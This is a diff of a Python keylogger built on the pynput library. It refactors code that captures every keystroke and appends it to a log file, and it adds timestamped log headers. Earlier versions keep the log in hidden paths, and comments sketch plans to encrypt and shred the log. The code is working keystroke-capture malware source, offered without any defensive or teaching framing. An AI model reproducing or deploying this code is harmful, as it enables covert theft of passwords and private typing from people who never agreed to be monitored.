@@ -2,7 +2,7 @@
 
 from pynput import keyboard
 import argparse
-import time
+import datetime
 import os
 
 # Globals
@@ -24,7 +24,7 @@ sett = (haum+"/Settings")
 logs = (haum+"/.Logs")
 conf = (home+"/.config")
 # Files
-lgLoc = "/config/file/dir/.keylog.log"
+lgPath = (home+"/Desktop/test.log")
 # Location Tests
 haumE = os.path.exists(haum)
 settE = os.path.exists(sett)
@@ -34,13 +34,19 @@ confE = (conf)
 
 # Class controls what keys are pressed on the keyboard
 class KeyControl:
-	# param key is the key pressed
-	# param F is used to track whether caps is on (1), or caps is off (0)
-	# param fullstr is the dynamic string being built as a list
-	# param fullstr2 is the final line to be written as a string
-	# param log is the log file to be written
-	def sort_key(key,F,fullstr,wLine,log):
+	"""
+	Grabs key and handles it appropriately
+	param key : str is the key pressed
+	param F : int is used to track whether caps is on (1), or caps is off (0)
+	param fullstr : list is the dynamic string being built as a list
+	param fullstr2 : str is the final line to be written as a string
+	param log : str is the log file to be written
+	var keyString : [str] is the key pressed formatted between brackets
+	var wLine : str line that is to be written
 
+	"""
+	def sort_key(key):
+		global F,fullstr,wLine,lgPath
 		try:
 			# Checks if the key pressed is a non-character key
 			if "Key." in str(key):
@@ -51,9 +57,7 @@ class KeyControl:
 					fullstr.append(keyString+"\n")
 					## Creates a string from the keys pressed list
 					wLine = ''.join([str(i) for i in fullstr])
-					## Prints current log
-					print (wLine+'\n')
-					writeline(wLine+'\n')
+					LogControl.writeLine(lgPath, (wLine+"\n"))
 					fullstr = []
 					wLine = ""
 					
@@ -88,21 +92,25 @@ class KeyControl:
 			# This captures normal ASCII characters
 			else:
 				keyString = str(key).strip("'")
-				#print(keyString+"\n",end='')
 				fullstr.append(keyString)
 			
 		except:
 			pass
 
-# Class controls log files
+# Class controls the logs
 class LogControl:
-	# Checks if parent directories of a specified file path exist
-	# param path is the full path that is being tested
-	# Creates paths to built directories if not found
+	"""
+
+	Checks the directories for validity in the given path
+	param path : str is the full path thats being split and tested
+	var testPath : str is a temporary path made to be tested and built
+	var pathSplit : list is a list with individual paths in them
+
+	"""
 	def dirCheck(path):
 		# Does not support relative paths.
-		testPath = "" # a temporary path built from the full path
-		pathSplit = path.split("/") # the given full path split into seperate file names
+		testPath = "" 
+		pathSplit = path.split("/")
 
 		# The range here assumes the last file in the path given is not a directory
 		for i in range(1,(len(pathSplit)-1)):
@@ -110,45 +118,59 @@ class LogControl:
 			if os.path.isdir(testPath) != True:
 				os.mkdir(testPath)
 
-	# Writes a captured line to the file
-	def writeLine(lgLoc,wLine):
+	"""
+
+	Writes a captured line to the file
+	param lgPath : str is the full path where the log is kept
+	param wLine : str is the line that is to be written
+	var logFile : File is the log file being written to
+
+	"""
+	def writeLine(lgPath,wLine):
 		try:
-			logFile = open(lgLoc,"a")
+			logFile = open(lgPath,"a")
 			logFile.write(wLine)
 		finally:
 			logFile.close()
 
-	# initialize log file
-	# param logOP is the operation mode of the log
-	# param lgLog is the keylogger log path
-	def initializeLog(logOP,lgLoc):
+	"""
+
+	Initialize the log file
+	param logOP : int is mode of operation for this function
+	param lgPath : str is the full path where the log is kept
+	var logFile : File is the log file being written to
+
+	"""
+	def initializeLog(logOP,lgPath):
 		# If logging is being destroyed (-1) then destroy log
 		if logOP == -1:
 			try:
-				logFile = open(lgLoc,"a")
+				logFile = open(lgPath,"a")
 			finally:
-				logFile.write(str(datetime.datetime.now().strftime(("-"*16)+"\n[--] Log Destroyed\n[%m/%d/%Y]:[%H:%M:%S]\n")))
+				logFile.write(str(datetime.datetime.now().strftime(("-"*16)+"\n[--] Log Destroyed\n[%m/%d/%Y]:[%H:%M:%S]\n")+("-"*16)))
 				logFile.close()
+				#encrypt logfile and cpy
+				#os.cmd(shred logfile)
 		# If logging is ON/STARTING (1) then write the starting header
 		elif logOP == 1:
 			try:
-				logFile = open(lgLoc,"a")
+				logFile = open(lgPath,"a")
 			finally:
+				logFile.write(str(datetime.datetime.now().strftime(("-"*16)+"\n[+] Log Started\n[%m/%d/%Y]:[%H:%M:%S]\n"+("-"*16)+"\n\n")))
 				logFile.close()
-				logFile.write(str(datetime.datetime.now().strftime("\n[+] Log Started\n[%m/%d/%Y]:[%H:%M:%S]\n"+("-"*16))))
 		# If logging is OFF/ENDING (0) then write the ending header
 		elif logOP == 0:
 			try:
-				logFile = open(lgLoc,"a")
+				logFile = open(lgPath,"a")
 			finally:
-				logFile.write(str(datetime.datetime.now().strftime(("-"*16)+"\n[-] Log Ended\n[%m/%d/%Y]:[%H:%M:%S]\n")))
+				logFile.write(str(datetime.datetime.now().strftime(("-"*16)+"\n[-] Log Ended\n[%m/%d/%Y]:[%H:%M:%S]\n"+("-"*16)+"\n")))
 				logFile.close()
 		# If logging is BUILDING/CREATE (2) then build the log
 		elif logOP == 2:
 			try:
-				logFile = open(lgLoc,"a")
+				logFile = open(lgPath,"a")
 			finally:
-				logFile.write(str(datetime.datetime.now().strftime(("-"*16)+"\n[++] Log Created\n[%m/%d/%Y]:[%H:%M:%S]\n"+("-"*16))))
+				logFile.write(str(datetime.datetime.now().strftime(("-"*16)+"\n[++] Log Created\n[%m/%d/%Y]:[%H:%M:%S]\n"+("-"*16)+"\n")))
 				logFile.close()
 		# Else, fix the input given to intializeLog
 		else:
@@ -159,19 +181,23 @@ class LogControl:
 ## Main Function
 ##
 def __main__():
-	capturetheflags()
-	if os.path.exists(LOGFILE) == True:
-		intializeLog(1, LOGFILE)
+	if os.path.exists(lgPath) == True:
+		LogControl.initializeLog(1, lgPath)
 	else:
-		intializeLog(2,LOGFILE)
-	#starts listening to the keyboard
+		LogControl.initializeLog(2, lgPath)
+		LogControl.initializeLog(1, lgPath)
 	try:
-		with keyboard.Listener(on_press=sort_key) as l:
+		#starts listening to the keyboard
+		with keyboard.Listener(on_press=KeyControl.sort_key) as l:
 			#with each key, run sort
 			l.join()
 	except:
 		print("\nSomething went wrong in __main__()")
 		exit(0)
+	finally:
+		LogControl.initializeLog(0, lgPath)
+		exit(0)
+	
 
 if __name__=="__main__":
 	__main__()
